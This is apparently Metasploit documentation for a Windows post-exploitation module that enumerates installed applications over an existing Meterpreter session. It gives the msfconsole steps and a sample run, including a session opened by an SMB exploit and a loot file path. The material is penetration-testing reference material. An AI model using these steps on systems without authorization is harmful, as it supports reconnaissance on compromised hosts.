## Vulnerable Application

  This module will enumerate all installed applications

## Verification Steps
  1. Start `msfconsole`
  2. Get meterpreter session
  3. Do: `use post/windows/gather/enum_applications`
  4. Do: `set SESSION <session id>`
  5. Do: `run`

## Options

  ```
  SESSION
  ```
  The session to run this module on.

## Scenarios

### A run on Windows 7 (6.1 Build 7601, Service Pack 1).

  ```
  [*] Meterpreter session 1 opened (192.168.1.3:4444 -> 192.168.1.4:49178) at 2019-12-10 14:18:44 -0700

  msf exploit(windows/smb/group_policy_startup) > use post/windows/gather/enum_applications
  msf post(windows/gather/enum_applications) > set SESSION 1
    SESSION => 1
  msf post(windows/gather/enum_applications) > run

    [*] Enumerating applications installed on MSF-PC

    Installed Applications
    ======================

    Name  Version
    ----  -------


    [+] Results stored in: /root/.msf4/loot/20191210142153_default_192.168.1.4_host.application_382950.txt
    [*] Post module execution completed
    ```
